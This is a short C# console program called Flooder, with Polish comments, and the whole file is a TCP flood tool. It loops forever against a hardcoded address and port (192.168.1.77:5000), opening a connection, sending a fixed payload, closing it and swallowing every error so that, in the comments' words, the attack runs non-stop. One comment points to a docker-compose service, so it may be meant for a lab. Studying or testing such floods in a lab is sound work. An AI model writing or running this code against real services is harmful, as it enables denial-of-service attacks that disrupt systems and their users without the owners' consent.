using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Flooder
{
    class Program
    {
        static void Main(string[] args)
        {
            // Adres serwera (nazwa usługi z docker-compose)
            IPAddress targetIp = IPAddress.Parse("192.168.1.77");
            int targetPort = 5000;

            Console.WriteLine("TCP Flood started...");
            Console.WriteLine($"Target: {targetIp}:{targetPort}");

            // Prosty payload (nie ma znaczenia co wysyłamy)
            byte[] payload = Encoding.ASCII.GetBytes("FLOOD_DATA");

            while (true)
            {
                try
                {
                    // Tworzymy nowe połączenie TCP
                    TcpClient client = new TcpClient();

                    // Bardzo krótki timeout – szybciej tworzymy kolejne połączenia
                    client.SendTimeout = 100;
                    client.ReceiveTimeout = 100;

                    client.Connect(targetIp, targetPort);

                    NetworkStream stream = client.GetStream();

                    // Wysyłamy dane
                    stream.Write(payload, 0, payload.Length);

                    // NIE odbieramy odpowiedzi (brak recv)
                    // To jest kluczowe dla floodu

                    // Zamykamy gniazdo (lub nie – obie wersje są poprawne)
                    client.Close();
                }
                catch
                {
                    // Ignorujemy błędy – atak ma działać non-stop
                }

                // Minimalne opóźnienie, żeby nie zabić systemu hosta
                Thread.Sleep(1);
            }
        }
    }
}
